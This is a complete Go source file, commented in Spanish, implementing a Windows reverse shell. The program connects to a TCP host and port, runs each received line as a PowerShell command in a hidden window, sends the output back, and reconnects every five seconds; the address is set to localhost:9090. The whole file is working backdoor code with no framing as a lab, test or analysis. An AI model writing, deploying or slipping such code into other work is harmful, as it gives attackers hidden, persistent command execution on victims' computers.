package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// Shell Reversa
func reverseShell(host string, port string) {
	con, err := net.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		fmt.Println("Error al conectar con la shell reversa:", err)
		return
	}
	defer con.Close()
	re := bufio.NewReader(con)
	for {
		cp, err := re.ReadString('\n')
		if err != nil {
			return
		}

		comando := strings.TrimSpace(cp)
		if comando == "" {
			continue
		}

		cmd := exec.Command("powershell.exe", "-NoProfile", "-Command", comando)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		salida, _ := cmd.CombinedOutput()
		con.Write(salida)
	}
}

func main() {
	for true {
		time.Sleep(5 * time.Second)
		reverseShell("localhost", "9090")
	}
}
